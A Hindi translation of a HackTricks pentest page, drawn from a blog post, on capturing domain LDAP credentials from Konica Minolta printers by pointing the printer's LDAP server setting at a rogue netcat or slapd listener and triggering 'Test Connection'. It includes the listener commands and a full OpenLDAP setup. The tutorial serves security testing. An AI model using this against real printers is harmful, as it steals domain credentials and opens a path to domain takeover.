<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>


इंटरनेट पर कई ब्लॉग हैं जो **LDAP के साथ कॉन्फ़िगर किए गए प्रिंटर्स को डिफ़ॉल्ट/कमजोर** लॉगऑन क्रेडेंशियल्स के साथ छोड़ने के खतरों को उजागर करते हैं।\
यह इसलिए है क्योंकि एक हमलावर **प्रिंटर को एक रूज LDAP सर्वर के खिलाफ प्रमाणित करने के लिए चालाकी कर सकता है** (आमतौर पर `nc -vv -l -p 444` पर्याप्त होता है) और प्रिंटर **क्रेडेंशियल्स को स्पष्ट-पाठ में कैप्चर** कर सकता है।

इसके अलावा, कई प्रिंटर्स में **उपयोगकर्ता नामों के साथ लॉग्स** होते हैं या वे डोमेन कंट्रोलर से **सभी उपयोगकर्ता नामों को डाउनलोड** भी कर सकते हैं।

यह सभी **संवेदनशील जानकारी** और सामान्य **सुरक्षा की कमी** प्रिंटर्स को हमलावरों के लिए बहुत दिलचस्प बनाती है।

इस विषय पर कुछ ब्लॉग:

* [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
* [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**निम्नलिखित जानकारी** [**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/) **से कॉपी की गई थी**

# LDAP सेटिंग्स

Konica Minolta प्रिंटर्स पर एक LDAP सर्वर को कॉन्फ़िगर करना संभव है, साथ ही क्रेडेंशियल्स के साथ। इन उपकरणों पर फर्मवेयर के पहले संस्करणों में मैंने सुना है कि पेज के html स्रोत को पढ़कर साधारणतः क्रेडेंशियल्स को पुनः प्राप्त करना संभव है। अब, हालांकि क्रेडेंशियल्स इंटरफ़ेस में वापस नहीं आते हैं इसलिए हमें थोड़ी अधिक मेहनत करनी पड़ती है।

LDAP सर्वर्स की सूची यहाँ है: Network > LDAP Setting > Setting Up LDAP

इंटरफ़ेस LDAP सर्वर को बिना क्रेडेंशियल्स को फिर से दर्ज किए बदलने की अनुमति देता है। मुझे लगता है कि यह एक सरल उपयोगकर्ता अनुभव के लिए है, लेकिन यह हमलावर को प्रिंटर के मास्टर से डोमेन पर एक पकड़ बनाने का अवसर देता है।

हम LDAP सर्वर पते की सेटिंग को हमारे नियंत्रण वाली मशीन में बदल सकते हैं, और "Test Connection" कार्यक्षमता की सहायता से एक कनेक्शन ट्रिगर कर सकते हैं।

# सामान सुनने के लिए

## netcat

यदि आपको मुझसे बेहतर किस्मत है, तो आप एक साधारण netcat लिसनर के साथ काम चला सकते हैं:
```
sudo nc -k -v -l -p 386
```
मुझे [@\_castleinthesky](https://twitter.com/\_castleinthesky) द्वारा आश्वासन दिया गया है कि यह अधिकतर समय काम करता है, हालांकि मुझे अभी तक इतनी आसानी से छूट नहीं मिली है।

## Slapd

मैंने पाया है कि पूर्ण LDAP सर्वर की आवश्यकता होती है क्योंकि प्रिंटर पहले एक नल बाइंड का प्रयास करता है और फिर उपलब्ध जानकारी की क्वेरी करता है, केवल यदि ये ऑपरेशन सफल होते हैं तो यह क्रेडेंशियल्स के साथ बाइंड करने की प्रक्रिया को आगे बढ़ाता है।

मैंने एक सरल ldap सर्वर की खोज की जो आवश्यकताओं को पूरा करता है, हालांकि विकल्प सीमित प्रतीत होते थे। अंत में मैंने एक ओपन ldap सर्वर सेटअप करने का निर्णय लिया और slapd डीबग सर्वर सेवा का उपयोग करके कनेक्शन स्वीकार करने और प्रिंटर से संदेशों को प्रिंट करने के लिए किया। (यदि आपको एक आसान विकल्प के बारे में पता है, तो मैं इसके बारे में सुनने के लिए खुश होऊंगा)

### स्थापना

(नोट: यह अनुभाग यहां दी गई गाइड का हल्के ढंग से संशोधित संस्करण है [https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap) )

रूट टर्मिनल से:

**OpenLDAP स्थापित करें,**
```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG

#> chown ldap. /var/lib/ldap/DB_CONFIG
```
**OpenLDAP एडमिन पासवर्ड सेट करें (आपको इसकी जल्द ही फिर से आवश्यकता होगी)**
```
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```
**मूल स्कीमाओं को आयात करें**
```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```
**LDAP DB पर अपना डोमेन नाम सेट करें।**
```
# generate directory manager's password
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```
**LDAP TLS कॉन्फ़िगर करें**

**SSL प्रमाणपत्र बनाएं**
```
#> cd /etc/pki/tls/certs
#> make server.key
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```
**Slapd को SSL/TLS के लिए कॉन्फ़िगर करें**
```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```
**अपनी लोकल फ़ायरवॉल के माध्यम से LDAP की अनुमति दें**
```
firewall-cmd --add-service={ldap,ldaps}
```
## परिणाम

एक बार जब आपने अपनी LDAP सेवा को स्थापित और कॉन्फ़िगर कर लिया, तो आप इसे निम्नलिखित कमांड के साथ चला सकते हैं:

> ```
> slapd -d 2
> ```

नीचे दिया गया स्क्रीनशॉट एक उदाहरण दिखाता है जब हम प्रिंटर पर कनेक्शन टेस्ट चलाते हैं। जैसा कि आप देख सकते हैं, यूजरनेम और पासवर्ड LDAP क्लाइंट से सर्वर तक पास किए जाते हैं।

![slapd terminal output containing the username "MyUser" and password "MyPassword"](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd\_output.png?resize=474%2C163\&ssl=1)

# यह कितना बुरा हो सकता है?

यह बहुत हद तक उन क्रेडेंशियल्स पर निर्भर करता है जो कॉन्फ़िगर किए गए हैं।

यदि न्यूनतम विशेषाधिकार का सिद्धांत अपनाया जा रहा है, तो आपको केवल एक्टिव डायरेक्टरी के कुछ तत्वों के लिए पढ़ने की एक्सेस मिल सकती है। यह अक्सर अभी भी मूल्यवान होता है क्योंकि आप उस जानकारी का उपयोग और अधिक सटीक हमले तैयार करने के लिए कर सकते हैं।

आमतौर पर आपको डोमेन यूजर्स समूह में एक खाता मिलने की संभावना होती है जो संवेदनशील जानकारी तक पहुंच प्रदान कर सकता है या अन्य हमलों के लिए प्रारंभिक प्रमाणीकरण बन सकता है।

या, मेरी तरह, आपको LDAP सर्वर सेटअप करने के लिए पुरस्कार मिल सकता है और आपको चांदी की थाली में डोमेन एडमिन खाता दिया जा सकता है।


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में शामिल हों या मुझे **Twitter** 🐦 पर **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के लिए अपनी हैकिंग ट्रिक्स साझा करें, PRs जमा करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में.

</details>
